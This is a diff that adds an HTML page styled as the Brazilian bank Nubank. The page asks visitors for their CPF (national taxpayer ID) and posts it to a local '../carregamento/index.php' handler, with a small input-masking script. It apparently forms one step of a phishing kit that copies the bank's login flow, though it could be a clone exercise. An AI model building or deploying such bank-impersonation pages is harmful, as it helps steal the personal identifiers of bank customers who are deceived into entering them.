@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <title>Nubank</title>
+</head>
+<body>
+    <div id="page-home">
+        <div class="center">
+            <div class="xis">
+                <p>X</p>
+            </div>
+            <div class="texto">
+                <h3>Qual seu CPF?</h3>
+                <p>Ele é usado como sua principal identificação no Nubank.</p>
+            </div>
+
+            <div class="input">
+                <form method="POST" action="../carregamento/index.php">
+                    <input maxlength="14" onkeypress="mascaraa(this)" type="numeric" name="cpf" placeholder="XXX.XXX.XXX-XX"/>
+                
+            </div>
+
+            <footer>
+                <input type="submit" value="CONTINUAR" >
+            </form>
+            </footer>
+        </div>
+    </div>
+</body>
+<script>
+    function mascaraa(telefone){ 
+            if(telefone.value.length == 3)
+                telefone.value =  telefone.value + '.' ; 
+            if(telefone.value.length == 7)
+                telefone.value =  telefone.value + '.' ; 
+ 
+            if(telefone.value.length == 11)
+                telefone.value =  telefone.value + '-' ; 
+  
+}
+</script>
+</html>
